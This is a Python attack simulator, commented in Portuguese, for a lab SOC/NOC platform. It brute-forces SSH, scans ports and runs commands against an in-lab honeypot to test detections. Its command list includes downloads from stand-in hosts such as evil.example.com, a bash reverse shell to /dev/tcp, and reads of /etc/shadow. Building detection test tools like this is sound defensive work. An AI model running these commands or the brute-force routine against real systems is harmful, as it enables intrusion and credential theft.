"""
Attack Simulator - SOC/NOC Platform
====================================
Simulador de ataques para testes em ambiente laboratorial.
Gera tráfego malicioso simulado para testar detecções.

⚠️ AVISO ÉTICO: Use APENAS em ambientes controlados e autorizados.
"""

import asyncio
import logging
import random
from datetime import datetime
from typing import List

import asyncssh
import redis.asyncio as aioredis

# BUG CORRIGIDO: logging não estava configurado — nada aparecia no stdout.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('simulator')

# Configurações
HONEYPOT_HOST = 'honeypot'
HONEYPOT_PORT = 2222
REDIS_URL = 'redis://redis:6379'

# Usuários e senhas para simulação
USERNAMES = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'mysql', 'ftp', 'user']
PASSWORDS = ['password', '123456', 'admin', 'root', 'test123', 'P@ssw0rd', 'qwerty', 'letmein']

# Comandos para simular
COMMANDS = [
    'ls -la',
    'whoami',
    'cat /etc/passwd',
    'uname -a',
    'ps aux',
    'netstat -tlnp',
    'wget http://malicious.example.com/backdoor.sh',
    'curl http://evil.example.com/payload',
    'chmod 777 /tmp/exploit',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'python -c "import socket,subprocess,os;s=socket.socket()"',
    'find / -name "*.conf" 2>/dev/null',
    'cat /etc/shadow',
    'id',
    'ifconfig',
]


class AttackSimulator:
    """Simula diferentes tipos de ataques."""

    def __init__(self):
        self.redis = None

    async def initialize(self):
        """Inicializa simulador."""
        self.redis = await aioredis.from_url(REDIS_URL, decode_responses=True)
        logger.info("Simulador de ataques inicializado")

    async def simulate_brute_force(self, target_host: str, target_port: int, num_attempts: int = 10):
        """Simula ataque de brute force SSH."""
        logger.info(f"Iniciando simulação de brute force em {target_host}:{target_port}")

        username = random.choice(USERNAMES)

        for i in range(num_attempts):
            password = random.choice(PASSWORDS)

            conn = None
            try:
                conn = await asyncssh.connect(
                    host=target_host,
                    port=target_port,
                    username=username,
                    password=password,
                    known_hosts=None,
                    connect_timeout=2
                )
            except Exception:
                # Falha esperada no brute force
                pass
            finally:
                # BUG CORRIGIDO: conexões bem-sucedidas não eram encerradas (resource leak).
                if conn is not None:
                    conn.close()
                    await conn.wait_closed()

            await asyncio.sleep(random.uniform(0.5, 2))

        logger.info(f"Brute force simulado concluído: {num_attempts} tentativas")

    async def simulate_port_scan(self, target_host: str, ports: List[int] = None):
        """Simula escaneamento de portas."""
        if ports is None:
            ports = list(range(1, 1024))

        logger.info(f"Iniciando simulação de port scan em {target_host}")

        for port in ports[:50]:  # Simula scan de 50 portas
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_host, port),
                    timeout=1
                )
                writer.close()
                await writer.wait_closed()
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                pass  # Porta fechada - esperado

            await asyncio.sleep(0.05)

        logger.info(f"Port scan simulado concluído: {min(50, len(ports))} portas")

    async def simulate_honeypot_interaction(self, target_host: str, target_port: int):
        """Simula interação com honeypot após login."""
        logger.info("Iniciando simulação de interação com honeypot")

        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)

        try:
            async with asyncssh.connect(
                host=target_host,
                port=target_port,
                username=username,
                password=password,
                known_hosts=None,
                connect_timeout=5
            ) as conn:
                # Executa alguns comandos
                num_commands = random.randint(2, 8)
                for _ in range(num_commands):
                    command = random.choice(COMMANDS)
                    try:
                        await conn.run(command, timeout=5)
                        logger.debug(f"Comando simulado: {command}")
                    except Exception:
                        pass

                    await asyncio.sleep(random.uniform(1, 3))

        except Exception as e:
            logger.debug(f"Simulação de interação: {e}")

    async def simulate_distributed_attack(self, num_sources: int = 5, target_host: str = 'honeypot', target_port: int = 2222):
        """Simula ataque distribuído de múltiplas fontes."""
        logger.info(f"Iniciando simulação de ataque distribuído ({num_sources} fontes)")

        tasks = []
        for _ in range(num_sources):
            task = asyncio.create_task(
                self.simulate_brute_force(target_host, target_port, num_attempts=3)
            )
            tasks.append(task)
            await asyncio.sleep(random.uniform(0.5, 2))

        await asyncio.gather(*tasks)
        logger.info("Ataque distribuído simulado concluído")

    async def run_continuous_simulation(self, interval: int = 60):
        """Executa simulações contínuas."""
        logger.info("Iniciando simulação contínua...")

        while True:
            try:
                attack_type = random.choice(['brute_force', 'honeypot_interaction', 'distributed'])

                if attack_type == 'brute_force':
                    await self.simulate_brute_force(HONEYPOT_HOST, HONEYPOT_PORT, num_attempts=5)
                elif attack_type == 'honeypot_interaction':
                    await self.simulate_honeypot_interaction(HONEYPOT_HOST, HONEYPOT_PORT)
                elif attack_type == 'distributed':
                    await self.simulate_distributed_attack(num_sources=3)

                logger.info(f"Aguardando {interval}s para próxima simulação...")
                await asyncio.sleep(interval)

            except Exception as e:
                logger.error(f"Erro na simulação: {e}")
                await asyncio.sleep(10)


async def main():
    """Função principal do simulador."""
    logger.info("=" * 60)
    logger.info("  SOC/NOC Platform - Simulador de Ataques")
    logger.info("  ⚠️  AVISO: Uso EXCLUSIVO em ambientes laboratoriais!")
    logger.info("=" * 60)

    simulator = AttackSimulator()
    await simulator.initialize()

    logger.info("Executando simulações iniciais...")

    await simulator.simulate_brute_force(HONEYPOT_HOST, HONEYPOT_PORT, num_attempts=8)

    await asyncio.sleep(5)

    await simulator.simulate_honeypot_interaction(HONEYPOT_HOST, HONEYPOT_PORT)

    await asyncio.sleep(5)

    await simulator.simulate_distributed_attack(num_sources=4)

    logger.info("Simulações iniciais concluídas!")
    logger.info("Iniciando simulação contínua (intervalo: 120s)...")

    await simulator.run_continuous_simulation(interval=120)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Simulador encerrado pelo usuário")
    except Exception as e:
        logger.error(f"Erro fatal: {e}")
